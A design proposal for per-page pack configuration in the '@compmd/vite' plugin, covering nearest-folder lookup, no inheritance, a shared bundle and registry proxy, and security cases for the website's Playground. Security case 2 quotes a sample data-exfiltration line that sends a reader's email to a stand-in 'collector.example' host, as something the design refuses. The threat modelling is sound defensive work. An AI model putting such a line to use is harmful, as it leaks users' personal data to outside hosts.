# Pack settings by page in `@compmd/vite`

**Status: proposed (2026-11-25).** Extends [the configuration and `@compmd/vite`](vite.md). Today one `compmd.config.json` holds the pack settings for a whole Vite project. With this change, each page of a project gets its own: the trust of each pack, the ambient packs, the registries, the fetching and the origins. The first use is the website and its Playground (CMD-410). The spec needs no change: §15 has the processor's configuration set each pack's level, and nothing in it says an application has only one.

## Proposed decisions

1. **The nearest configuration wins.** A module that imports `virtual:compmd` gets the configuration of the nearest folder, from the module's own folder up to Vite's root, that holds `compmd.config.json` (or a `compmd` key in `package.json`). `website/playground/src/App.svelte` gets `website/playground/compmd.config.json`, and `website/src/framed.ts` gets `website/compmd.config.json`. A module with no configuration between it and the root gets the root's, or an empty one, as today.
2. **No inheritance.** A configuration is whole: nothing passes from one folder's to a nested folder's. If a nested configuration doesn't mention a pack, that pack gets the defaults (strict, not ambient), never the trust a parent folder gave it. A configuration that forgot a key then grants less, never more.
3. **Folder paths are relative to their own configuration's folder.** The root's paths stay relative to Vite's root, as today. In `website/playground/compmd.config.json`, `../app` is `website/app`.
4. **What a page can run is what its own virtual module imports.** Each configuration gets its own `virtual:compmd`, with its own `request` (packs, ambient packs, policy, origins), its own `sandbox.trusted`, and its own `registry`. A trusted component is imported only by the virtual module of a configuration that trusts it. So a page whose configuration doesn't trust a pack has none of its code in its chunks, and its documents can only reach that pack in a frame.
5. **A page reaches one configuration.** If an entry's chunks import the virtual modules of two configurations, the build stops and names the modules that import each. For example, a helper in `website/src` that imports `virtual:compmd` and is also imported by the Playground. The dev server checks the same thing when it loads a page and shows the error in the page.
6. **One bundle.** The bundle (`compmd/`) holds what every configuration needs.
   - **Packs:** each pack's files once, at `packs/<name>@<version>/`. A pack that one configuration trusts and another doesn't is also compiled for the frames.
   - **Frames:** one build of the frames for each distinct `libraries` list, under its own hash, as today. Two configurations with the same libraries share it.
   - **Headers:** one `_headers` file.
7. **One registry proxy, for every configuration's registries.** The proxy at `compmd/registry/` passes requests on to the registries every configuration names. If two configurations send one scope to different registries, the build stops. The proxy isn't a permission boundary: it is a public URL, and a document never names a registry. What a page can import from a registry is decided by its own `registry` and policy (decision 4).
8. **One configuration works as before.** With only a root configuration, every module gets it. The virtual module keeps its id (`\0virtual:compmd`), and the bundle is the same, byte for byte. The plugin's `config` option is the root's configuration. `buildBundle` and `cspFor` take one configuration, as they do now; a host without Vite calls them once for each configuration.

## Terms

- **A page's configuration:** the configuration of the modules its HTML entry loads that import `virtual:compmd` (decision 1).
- **Nested configuration:** a `compmd.config.json` below Vite's root, other than the root's own.

## The website with this change

```
website/
  compmd.config.json             { "packs": { "./app": { "trust": "trusted", "ambient": true } }, "libraries": ["d3"] }
  src/framed.ts                  → the site's configuration: `stars` runs in the page
  playground/
    compmd.config.json           { "packs": { "./examples/charts": { "ambient": true }, "./packs/minimermaid": {},
                                              "../app": { "ambient": true } },
                                   "libraries": ["d3"], "registries": { "*": "https://registry.npmjs.org/" },
                                   "fetch": "direct" }
    src/App.svelte, documents.ts → the Playground's configuration: `stars` runs in a frame
```

What each page gets:

| | Site pages | Playground |
|---|---|---|
| `@site/app` | trusted: its code is in the site's chunks | strict: `packs/@site/app@1.0.0/Stars.svelte.js`, in a frame |
| `charts` | not available | ambient |
| Registries | none: `registry` is `undefined` | npm, fetched by the reader's browser |
| Frames | `frames/<hash>/`, with d3 | the same frames (same libraries) |

## The security cases

1. **A shared Playground document meets the site's trusted pack.** Suppose a reader opens a link to someone else's document in the Playground, and that document uses `stars` with any params. The Playground's configuration doesn't trust `@site/app`, so its virtual module doesn't import `Stars.svelte`, and its processor's policy says strict. The component runs in an opaque-origin frame with no network. Even if a bug in `app/` mishandles a param, it can't reach the page, its storage or the network. Tested: the Playground's built chunks don't contain the trusted `Stars` module, and a use of `stars` there renders in a frame.
2. **Every origin for the site's own documents, never for others'.** If the site's configuration says `"origins": "any"` for its posts, the Playground's still says nothing. A shared document's `from: https://collector.example/?v={{md.input.email}}` is then refused (F028) or asked about, as spec §15 asks of a host showing documents others write. Tested: each virtual module's `request.allowedOrigins` and `sandbox.origins` are its own configuration's.
3. **Registry access.** The Playground may import any npm pack; the site's pages import none. Tested: the site's `registry` is `undefined` and its policy refuses an unlisted pack it doesn't install; the Playground's resolves one.
4. **A page that reaches two configurations** stops the build (decision 5). Without that check, a shared helper could quietly give the Playground the site's trusted components. Tested with a fixture where a helper imports `virtual:compmd` and both pages import the helper.
5. **No inheritance** (decision 2). Tested: a nested configuration that doesn't list a pack the root trusts gets it strict.
6. **Not covered: pages on one origin share it.** The Playground and the site are both served from compmd.dev. Strict frames are isolated, but trusted code on a site page runs on the same origin as the Playground's page, with the same `localStorage`. A host that needs pages isolated from each other serves them from different origins; per-page configuration doesn't change that.

## The second example: an app with editors and readers

A publication's app has an editorial preview, for staff, and a page of readers' posts:

```
src/
  compmd.config.json          ./components trusted and ambient (the house style, a newsletter sign-up given `host`),
                              "origins": "any"
  community/
    compmd.config.json        "imports": "listed", @kit/mermaid only, no origins: readers' images and data are asked about
    main.ts                   → the community configuration
  editor/main.ts              → the root configuration
```

A post in `community/` can't mount the sign-up component, can't import packs other than `@kit/mermaid`, and can't reach an origin without the reader agreeing. The editorial page keeps all of that.

## Questions, with proposed answers

**P1. Choose by location, or by name?** The alternative is explicit: `import … from "virtual:compmd/playground"`, with the configurations named in one file. That is easier to search for, but a page would name its configuration in its own code, and a copied import would carry it along unnoticed. Proposed: by location (decision 1), as TypeScript and ESLint find their configuration files, together with the two-configuration check (decision 5). The Playground's files already sit beside their own configuration.

**P2. Nested configurations above an `out` bundle (Tauri).** An app built with `out` has a single page in practice. Proposed: nested configurations work there as well, and the adapter serves the one bundle. No adapter change is needed, since the bundle layout is the same.

**P3. Watching.** In dev, the plugin watches every `compmd.config.json` under the root, except in `node_modules` and `out`. Adding or removing one reloads the pages, as a change to the root's does now.

## Tests

- **Unit:** finding a module's configuration (its own folder, a parent's, the root's, none); no inheritance; paths relative to their configuration; registries that conflict; a page that reaches two configurations.
- **Build:** a fixture with a root and a nested configuration:
  - each virtual module's contents;
  - the bundle holding a pack compiled once when one configuration trusts it and another doesn't;
  - frames shared when the libraries are the same, and two builds when they differ;
  - the single-configuration example's bundle unchanged.
- **Browser (Chrome and WebKit):** the fixture's two pages: the trusted component in the page on one, in a frame on the other.
- **The website** (CMD-410): the Playground as a page of the site, with these tests applied to it.

## Not in this change

- Configuration chosen by URL at run time: a page's configuration is fixed when it is built.
- Merging or extending configurations (`"extends"`), which decision 2 leaves out on purpose. It can be added later as an explicit key if copying gets tedious.
- Serving pages from different origins (security case 6).
